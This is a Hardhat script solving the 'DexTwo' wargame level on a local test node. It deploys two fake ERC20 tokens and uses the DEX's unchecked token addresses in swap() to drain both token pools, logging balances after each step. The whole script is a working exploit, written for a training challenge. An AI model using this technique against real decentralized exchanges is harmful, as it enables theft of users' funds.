import { ethers } from "hardhat";

//Fit player address chosen from hardhat node addresses and contract address (current lvl instance)
const PLAYER_ADDRESS = "0x9965507D1a55bcC2695C58ba16FB37d819B0A4dc";
const CONTRACT_ADDRESS = "0x7218B7FB1b7f98EE6357Adb600668957bcbFA571";

async function main() {
const signer = await ethers.getSigner(PLAYER_ADDRESS);
const contract = await ethers.getContractAt("DexTwo", CONTRACT_ADDRESS, signer);

const attackerContractFactory = await ethers.getContractFactory("SwappableTokenTwo", signer);
const attackerContract = await attackerContractFactory.deploy(contract.address, "HackToken", "HCT", 1000000);
const attackerContract2 = await attackerContractFactory.deploy(contract.address, "HackToken2", "HCT2", 1000000);

//HACK STEPS
//In this challenge, the dex swap() function does not check the token addresses are the ones set
// by the owner, so it could be attacked using other ERC20 tokens. 
//We 'll create two fake tokens in order to trick the logic of getSwapAmount and drain the pools,
//by sending 1 each hack token previously, and then swapping 1 fake token for all 100 token units
// of the other pair.  
//getSwapAmount --> Desired token amount = 100 = (1 * 100/1).  

// 1. Check initial balances of DexTwo contract and my HackTokens

const token1 =  await contract.token1();
const token2 =  await contract.token2();
console.log("Token 1: ", token1);
console.log("Token 2: ", token2);

let dexToken1Balance = await contract.balanceOf(token1, contract.address);
let dexToken2Balance = await contract.balanceOf(token2, contract.address);
let myToken1Balance = await contract.balanceOf(token1, PLAYER_ADDRESS);
let myToken2Balance = await contract.balanceOf(token2, PLAYER_ADDRESS);
console.log("DEX Token 1 balance: ", dexToken1Balance);
console.log("DEX Token 2 balance: ", dexToken2Balance);
console.log("my Token 1 balance: ", myToken1Balance);
console.log("my Token 2 balance: ", myToken2Balance);

const hackToken =  attackerContract.address;
const hackToken2 =  attackerContract2.address;
let myHackTokenBalance = await attackerContract.balanceOf(PLAYER_ADDRESS);
let myHackToken2Balance = await attackerContract2.balanceOf(PLAYER_ADDRESS);
console.log("my HackToken balance: ", myHackTokenBalance);
console.log("my HackToken2 balance: ", myHackToken2Balance);

// 2. Approve the dex to manage tokens and hack tokens spendance 
await contract.approve(contract.address,1000000);
await attackerContract.increaseAllowance(contract.address,10000);
await attackerContract2.increaseAllowance(contract.address,10000);


// 3. Transfer both hack tokens amount to dex address before swapping. 
// Swapping 1 token is calculated to get 100 tokens of the other token pair, 
// according to how getSwapAmount computes the amount. 
await attackerContract.transfer(contract.address, 1);
await attackerContract2.transfer(contract.address, 1);


// 4. Call swap function and check all balances. 
await contract.swap(hackToken, token1, 1);
dexToken1Balance = await contract.balanceOf(token1, contract.address);
dexToken2Balance = await contract.balanceOf(token2, contract.address);
let dexHackTokenBalance = await contract.balanceOf(hackToken, contract.address);
let dexHackToken2Balance = await contract.balanceOf(hackToken2, contract.address);
myToken1Balance = await contract.balanceOf(token1, PLAYER_ADDRESS);
myToken2Balance = await contract.balanceOf(token2, PLAYER_ADDRESS);
myHackTokenBalance = await attackerContract.balanceOf(PLAYER_ADDRESS);
myHackToken2Balance = await attackerContract2.balanceOf(PLAYER_ADDRESS);
console.log("1 swap, DEX Token 1 balance: ", dexToken1Balance);
console.log("1 swap, DEX Token 2 balance: ", dexToken2Balance);
console.log("1 swap, DEX HackToken balance: ", dexHackTokenBalance);
console.log("1 swap, DEX HackToken2 balance: ", dexHackToken2Balance);
console.log("1 swap, my Token 1 balance: ", myToken1Balance);
console.log("1 swap, my Token 2 balance: ", myToken2Balance);
console.log("1 swap, my HackToken balance: ", myHackTokenBalance);
console.log("1 swap, my HackToken2 balance: ", myHackToken2Balance);



// 4. Now, we swap the other pair to drain the other dex pool. Check balances again.
await contract.swap(hackToken2, token2, 1);
dexToken1Balance = await contract.balanceOf(token1, contract.address);
dexToken2Balance = await contract.balanceOf(token2, contract.address);
dexHackTokenBalance = await contract.balanceOf(hackToken, contract.address);
dexHackToken2Balance = await contract.balanceOf(hackToken2, contract.address);
myToken1Balance = await contract.balanceOf(token1, PLAYER_ADDRESS);
myToken2Balance = await contract.balanceOf(token2, PLAYER_ADDRESS);
myHackTokenBalance = await attackerContract.balanceOf(PLAYER_ADDRESS);
myHackToken2Balance = await attackerContract2.balanceOf(PLAYER_ADDRESS);
console.log("2 swap, DEX Token 1 balance: ", dexToken1Balance);
console.log("2 swap, DEX Token 2 balance: ", dexToken2Balance);
console.log("2 swap, DEX HackToken balance: ", dexHackTokenBalance);
console.log("2 swap, DEX HackToken2 balance: ", dexHackToken2Balance);
console.log("2 swap, my Token 1 balance: ", myToken1Balance);
console.log("2 swap, my Token 2 balance: ", myToken2Balance);
console.log("2 swap, my HackToken1 balance: ", myHackTokenBalance);
console.log("2 swap, my HackToken2 balance: ", myHackToken2Balance);

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
